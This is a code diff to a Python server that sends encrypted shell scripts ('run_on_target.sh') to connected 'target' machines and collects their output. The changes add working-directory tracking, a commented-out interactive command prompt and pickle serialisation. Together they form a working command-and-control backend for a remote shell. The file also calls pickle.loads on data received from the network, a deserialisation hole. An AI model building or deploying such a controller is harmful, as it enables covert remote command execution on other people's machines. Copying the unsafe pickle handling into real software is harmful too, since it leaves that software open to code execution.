@@ -3,6 +3,7 @@ import socket
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import os
 import json
+import pickle
 
 # '0.0.0.0' # listen to incoming connections from anywhere
 # '192.168.x.x' # listen to only within same LAN
@@ -13,9 +14,12 @@ import json
 with open("server_config.json") as config_f:
     config = json.load(config_f)
 
+cwd = None
 LISTEN_IP = config['LISTEN_IP']
 LISTEN_PORT = config['LISTEN_PORT']
 
+STATUS_SUCCESS = 1
+STATUS_ERROR = 0
 
 def read_key(key_fpath):
     with open(key_fpath, 'r') as key_f:
@@ -23,17 +27,22 @@ def read_key(key_fpath):
         symm_key = bytes.fromhex(hex_key)
     return symm_key
 
-def get_encrypted_msg(symmetric_key, msg: str):
+def get_encrypted_msg(symmetric_key, msg, bytes=False):
     aesgcm = AESGCM(symmetric_key)
     nonce = os.urandom(12)
-    msg_bytes = msg.encode()
+    if bytes:
+        msg_bytes = msg
+    else: # string
+        msg_bytes = msg.encode()
     ct = aesgcm.encrypt(nonce=nonce, 
                         data=msg_bytes,
                         associated_data=None)
     return nonce + ct
 
-def decrypt_ct(symmetric_key, msg_ct):
-
+# returns status: enum, decrypted_ct: string | bytes
+def decrypt_ct(symmetric_key, msg_ct, bytes=False):
+    status = STATUS_SUCCESS
+    out_msg = "ERROR"
     try:
         # we are given nonce + ct
         nonce_length = 12
@@ -44,11 +53,14 @@ def decrypt_ct(symmetric_key, msg_ct):
         dec_msg_bytes = aesgcm.decrypt(nonce=nonce,
                     data=ct,
                     associated_data=None)
-        dec_msg = dec_msg_bytes.decode()
-        return dec_msg
+        out_msg = dec_msg_bytes
+        if not bytes: # output string
+            out_msg = dec_msg_bytes.decode()
     except Exception as e:
-        error_msg = f"Error: Received bad message. Client likely has incorrect key!"
-        return error_msg
+        status = STATUS_ERROR
+        out_msg = f"Error: Received bad message. Sender likely has incorrect key!"
+
+    return status, out_msg
 
 
 # def receive_msg(connection, buffer_size=1024):
@@ -101,50 +113,77 @@ def run_server(ip, port):
     print(f"server running :{port} <- {ip}")
     host = ip  # socket.gethostname()
     # create socket
-    server_socket = socket.socket() # socket.AF_INET, socket.SOCK_STREAM
-    # bind socket to (host, port)
-    server_socket.bind((host, port))
-    # listen for incoming connection (only 1)
-    server_socket.listen(5)
+    # server_socket = socket.socket() # socket.AF_INET, socket.SOCK_STREAM
+    with socket.socket() as server_socket: # graceful exception handling
+        # bind socket to (host, port)
+        server_socket.bind((host, port))
+        # listen for incoming connection (only 1)
+        server_socket.listen(5)
 
-    while True:
-        # accept connection
-        conn, address = server_socket.accept()
-        print(f"accepted conn from {address}")
+        while True:
+            # accept connection
+            conn, address = server_socket.accept()
+            print(f"accepted conn from {address}")
+                
+            # read private key
+            symm_key = read_key("symm_key.txt")
 
-        # read code to run on target
-        with open("run_on_target.sh", 'r') as file:
-            message = file.read()
-            
-        # read private key
-        symm_key = read_key("symm_key.txt")
-
-        encrypted_msg = get_encrypted_msg(symmetric_key=symm_key,
-                                          msg=message)
-        # send msg to target
-        send_msg(
-            connection=conn,
-            out_bytes=encrypted_msg,
+            # get the current working directory
+            cwd_ct = receive_msg(
+                connection=conn,
+                buffer_size=1024
             )
+            global cwd
+            if cwd is None: # if it's my first time accepting connection
+                status, cwd = decrypt_ct(
+                    symmetric_key=symm_key,
+                    msg_ct=cwd_ct
+                )
+            if status == STATUS_SUCCESS:
+                # read code to run on target
+                with open("run_on_target.sh", 'r') as file:
+                    commands = file.read()
+                # ask for code to run on target
+                # commands = input(f"[{cwd}] $ ")
+                message = pickle.dumps((cwd, commands))
+                encrypted_msg = get_encrypted_msg(symmetric_key=symm_key,
+                                                msg=message,
+                                                bytes=True)
+                # send msg to target
+                send_msg(
+                    connection=conn,
+                    out_bytes=encrypted_msg,
+                    )
 
-        # receive output from running code on client side
-        output_ct = receive_msg(
-            connection=conn,
-            buffer_size=1024
-        )
+                # receive output from running code on client side
+                output_ct = receive_msg(
+                    connection=conn,
+                    buffer_size=1024
+                )
 
-        script_output = decrypt_ct(
-            symmetric_key=symm_key,
-            msg_ct=output_ct
-        )
+                status, dec_ct = decrypt_ct(
+                    symmetric_key=symm_key,
+                    msg_ct=output_ct,
+                    bytes=True
+                )
+                if status == STATUS_ERROR:
+                    print("could not decrypt output")
+                else:
+                    cwd, script_output = pickle.loads(dec_ct)
+                    print(f"received cwd: {cwd}")
 
-        # write out output
-        script_fname = "script_output.txt"
-        with open(script_fname, "w") as f:
-            f.write(script_output)
+                    # write out output
+                    script_fname = "script_output.txt"
+                    with open(script_fname, "w") as f:
+                        f.write(script_output)
+                    # print(script_output)
+            else:
+                # cwd is error message
+                print(cwd)
+                cwd = None
 
-        # close connection
-        conn.close()        
+            # close connection
+            conn.close()        
 
 if __name__ == '__main__':
     run_server(LISTEN_IP, LISTEN_PORT)
